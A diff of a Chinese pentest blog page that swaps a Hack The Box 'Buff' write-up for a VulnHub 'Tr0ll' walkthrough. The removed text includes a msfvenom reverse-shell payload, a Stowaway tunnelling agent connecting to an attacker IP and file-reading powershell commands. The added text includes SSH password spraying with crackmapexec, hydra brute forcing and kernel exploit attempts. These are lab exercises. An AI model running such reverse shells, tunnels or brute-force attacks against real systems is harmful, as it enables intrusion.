@@ -16,24 +16,24 @@
   <meta name="author" content="FYHypo">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0x01 端口扫描    0x02 web    优先尝试命令执行    看起来是一个文件上传的getshell，用id参数访问触发   12powershell -c &quot;gci -r -file c:\users&quot;powershell -c &quot;gc C:\users\shaun\Desktop\user.txt&quot;  0x03 加固 开smb拿nc把she">
+    <meta name="description" content="vulhub Tr0ll walkthrough 0x01 端口扫描 tcp：    udp：    详细信息扫描：    ftp允许匿名登录，且有一个lol.pcap文件可写操作系统为ubuntuweb服务有两个目录被扫出来，但什么也没有：   脚本扫描：    脚本扫描没有暴露出什么信息粗略的看了web服务，什么也没有，且ftp存在匿名登录跑起目录爆破，开始ftp渗透：  0x02 ftp渗透">
 <meta property="og:type" content="article">
-<meta property="og:title" content="HTB Buff">
-<meta property="og:url" content="https://fyhypo.github.io/HTB/HTB%20Buff/index.html">
+<meta property="og:title" content="vulhub Tr0ll">
+<meta property="og:url" content="https://fyhypo.github.io/blog/vulnhub/vulnhub%20Tr0ll/index.html">
 <meta property="og:site_name" content="FYHypo&#39;s blog">
-<meta property="og:description" content="0x01 端口扫描    0x02 web    优先尝试命令执行    看起来是一个文件上传的getshell，用id参数访问触发   12powershell -c &quot;gci -r -file c:\users&quot;powershell -c &quot;gc C:\users\shaun\Desktop\user.txt&quot;  0x03 加固 开smb拿nc把she">
+<meta property="og:description" content="vulhub Tr0ll walkthrough 0x01 端口扫描 tcp：    udp：    详细信息扫描：    ftp允许匿名登录，且有一个lol.pcap文件可写操作系统为ubuntuweb服务有两个目录被扫出来，但什么也没有：   脚本扫描：    脚本扫描没有暴露出什么信息粗略的看了web服务，什么也没有，且ftp存在匿名登录跑起目录爆破，开始ftp渗透：  0x02 ftp渗透">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://fyhypo.github.io/img/Buff.jpg">
-<meta property="article:published_time" content="2024-08-31T05:29:18.301Z">
-<meta property="article:modified_time" content="2024-08-31T09:41:20.718Z">
+<meta property="og:image" content="https://fyhypo.github.io/img/Tr0ll.jpg">
+<meta property="article:published_time" content="2024-03-28T07:47:09.098Z">
+<meta property="article:modified_time" content="2024-08-31T09:37:57.322Z">
 <meta property="article:author" content="FYHypo">
 <meta property="article:tag" content="pentest">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fyhypo.github.io/img/Buff.jpg">
+<meta name="twitter:image" content="https://fyhypo.github.io/img/Tr0ll.jpg">
   
   
   
-  <title>HTB Buff - FYHypo&#39;s blog</title>
+  <title>vulhub Tr0ll - FYHypo&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="HTB Buff"></span>
+            <span id="subtitle" data-typed-text="vulhub Tr0ll"></span>
           
         </div>
 
@@ -214,8 +214,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-08-31 13:29" pubdate>
-          2024年8月31日 下午
+        <time datetime="2024-03-28 15:47" pubdate>
+          2024年3月28日 下午
         </time>
       </span>
     
@@ -226,7 +226,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          180 字
+          702 字
         
       </span>
     
@@ -237,7 +237,7 @@
         
         
         
-          2 分钟
+          6 分钟
         
       </span>
     
@@ -274,68 +274,142 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">HTB Buff</h1>
+            <h1 id="seo-header">vulhub Tr0ll</h1>
             
             
               <div class="markdown-body">
                 
-                <p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134222.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134721.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134804.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818134911.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135404.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="0x02-web"><a href="#0x02-web" class="headerlink" title="0x02 web"></a>0x02 web</h2><p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135044.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135329.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135456.png" srcset="/img/loading.gif" lazyload></p>
-<blockquote>
-<p>优先尝试命令执行</p>
+                <p>vulhub Tr0ll walkthrough</p>
+<h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote>
+<p>tcp：</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135651.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143514.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <blockquote>
-<p>看起来是一个文件上传的getshell，用id参数访问触发</p>
+<p>udp：</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818135832.png" srcset="/img/loading.gif" lazyload></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">powershell -c <span class="hljs-string">&quot;gci -r -file c:\users&quot;</span><br>powershell -c <span class="hljs-string">&quot;gc C:\users\shaun\Desktop\user.txt&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143523.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>详细信息扫描：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143534.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>ftp允许匿名登录，且有一个lol.pcap文件可写<br>操作系统为ubuntu<br>web服务有两个目录被扫出来，但什么也没有：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143541.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+</blockquote>
+<blockquote>
+<p>脚本扫描：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143608.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>脚本扫描没有暴露出什么信息<br>粗略的看了web服务，什么也没有，且ftp存在匿名登录<br>跑起目录爆破，开始ftp渗透：</p>
+</blockquote>
+<h2 id="0x02-ftp渗透"><a href="#0x02-ftp渗透" class="headerlink" title="0x02 ftp渗透"></a>0x02 ftp渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143621.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>注意：要用binary模式下数据包(二进制)文件！否则会损失内容！</p>
+</blockquote>
+<blockquote>
+<p>PCAP（Packet Capture）文件是一种用于捕获网络数据包的文件格式。它包含了网络通信期间捕获到的数据包的详细信息，例如源地址、目标地址、数据包类型和传输协议。</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143632.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>目录爆破没有结果，放心开始分析数据包：</p>
+</blockquote>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143654.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>追踪可疑的ftp数据流发现下载了一个<code>secret_stuff.txt</code>的文件</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143705.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143717.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>获得了一个像web路径的单词<code>sup3rs3cr3tdirlol</code>，尝试访问：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143737.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>得到一个二进制文件，就用wireshark打开：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143744.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>让我们去找地址为0x0856BF的进程？</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143755.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>猜测是找Identification为0x0856BF的数据包，但是没找到<br>以为是知识盲区看了wp，结果竟然还是web路径！</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143805.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143819.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>得到好像是用户名的列表，爆破ftp和ssh中优先选择ssh：</p>
+</blockquote>
+<h3 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h3><blockquote>
+<p>尝试密码喷射，以防用户名和密码有重叠：</p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackmapexec ssh 10.10.10.135 -p user.txt -u user.txt  --continue-on-success | grep <span class="hljs-string">&#x27;+&#x27;</span> <br></code></pre></td></tr></table></figure>
 
-<h2 id="0x03-加固"><a href="#0x03-加固" class="headerlink" title="0x03 加固"></a>0x03 加固</h2><blockquote>
-<p>开smb拿nc把shell反弹出来</p>
-</blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818143452.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>上线stowaway</p>
+<p>hydra大字典爆破：</p>
 </blockquote>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">start</span> <span class="hljs-string">&quot;&quot;</span> stow-agent-x64.exe -c <span class="hljs-number">10.10.16.8:5566</span> -s <span class="hljs-number">123456</span> --cs gbk --reconnect <span class="hljs-number">10</span><br></code></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.135 ssh<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818152156.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143839.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <blockquote>
-<p>至此站稳了脚步</p>
+<p>果然ssh不该大字典爆破<br>这里又看了wp，作者提示的密码居然是<code>Pass.txt</code>这个字符串…</p>
 </blockquote>
-<h2 id="0x04-提权"><a href="#0x04-提权" class="headerlink" title="0x04 提权"></a>0x04 提权</h2><p>查询.net版本：</p>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">reg query &quot;HKLM\SOFTWARE\Microsoft\<span class="hljs-built_in">NET</span> Framework Setup\NDP\v4\Full&quot; /v Release<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818152454.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143903.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <blockquote>
-<p>版本为4.8，放心用winpeas</p>
+<p>这脑洞没谁了…</p>
 </blockquote>
-<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">start</span> &quot;&quot; <span class="hljs-built_in">cmd</span> /C &quot;winpeas-x64.exe log&quot;<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818161022.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143911.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="0x03-内核提权"><a href="#0x03-内核提权" class="headerlink" title="0x03 内核提权"></a>0x03 内核提权</h2><blockquote>
+<p>linpeas枚举：</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143931.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144005.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
 <blockquote>
-<p>发现了denfender</p>
+<p>linpeas枚举结果看出大概率内核提权，三个高可能项：CVE-2016-5195、CVE-2015-1328、CVE-2015-8660</p>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818162757.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>奇怪的开在本地的进程，刚刚gci扫目录好像也看到了它的执行文件</p>
+<p>先试脏牛CVE-2016-5195：</p>
+<ol>
+<li>40616编译成功，执行失败</li>
+<li>34923编译失败</li>
+<li>43345编译成功，执行失败</li>
+</ol>
 </blockquote>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818162913.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818171538.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240818171915.png" srcset="/img/loading.gif" lazyload></p>
 <blockquote>
-<p>原poc执行的是calc.exe，用msfvenom生成反弹shell的shellcode替换</p>
+<p>试CVE-2015-1328，这个版本号、操作系统都对上了：</p>
 </blockquote>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4444 -b <span class="hljs-string">&#x27;\x00\x0A\x0D&#x27;</span> -f python -v payload<br></code></pre></td></tr></table></figure>
-
-<p><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240819105831.png" srcset="/img/loading.gif" lazyload><br><img src="https://raw.githubusercontent.com/FYHypo/FYHypo.github.io/main/img/pic/Pasted%20image%2020240819105838.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144014.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144052.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>成功提权</p>
+</blockquote>
+<h2 id="0x04-反思总结"><a href="#0x04-反思总结" class="headerlink" title="0x04 反思总结"></a>0x04 反思总结</h2><blockquote>
+<ol>
+<li>拿到无明显特征文件(如本机的roflmao)时要用工具判断文件类型，而不是直接打开：</li>
+</ol>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144108.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<p>可以直接执行，也可以用strings命令读数据（用于从一个二进制文件中提取可读的字符串）</p>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144418.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144441.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<ol start="2">
+<li>不管拿到什么奇怪的字符串都要勇于去试是不是web路径，即使是0x0856BF这种地址字符串</li>
+</ol>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144459.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<blockquote>
+<ol start="3">
+<li>本机的rolfmao为32位ELF可执行文件，可执行文件可以用IDA反编译出源码：</li>
+</ol>
+</blockquote>
+<p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144519.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="0x05-靶机总结"><a href="#0x05-靶机总结" class="headerlink" title="0x05 靶机总结"></a>0x05 靶机总结</h2><ol>
+<li>端口扫描：ftp、web、ssh开启</li>
+<li>ftp渗透：匿名登录拿到一个流量包，分析得到web路径，拿到ssh用户名和密码，获得了立足点</li>
+<li>内核提权：linpeas枚举出可能的cve，多次分析尝试后成功提权</li>
+</ol>
 
                 
               </div>
@@ -354,7 +428,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
+  <a href="/categories/vulnhub/" class="category-chain-item">vulnhub</a>
   
   
 
@@ -381,8 +455,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>HTB Buff</div>
-      <div>https://fyhypo.github.io/HTB/HTB Buff/</div>
+      <div>vulhub Tr0ll</div>
+      <div>https://fyhypo.github.io/blog/vulnhub/vulnhub Tr0ll/</div>
     </div>
     <div class="license-meta">
       
@@ -394,7 +468,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年8月31日</div>
+          <div>2024年3月28日</div>
         </div>
       
       
@@ -426,9 +500,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/HTB/HTB%20Toolbox/" title="Toolbox">
+                      <a href="/blog/vulnhub/vulnhub%20Billub0x/" title="vulhub Billub0x">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Toolbox</span>
+                        <span class="hidden-mobile">vulhub Billub0x</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -436,8 +510,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/HTB/HTB%20Driver/" title="HTB Driver">
-                        <span class="hidden-mobile">HTB Driver</span>
+                      <a href="/blog/vulnhub/vulnhub%20Hackademic.RTB1/" title="vulhub Hackademic.RTB1">
+                        <span class="hidden-mobile">vulhub Hackademic.RTB1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
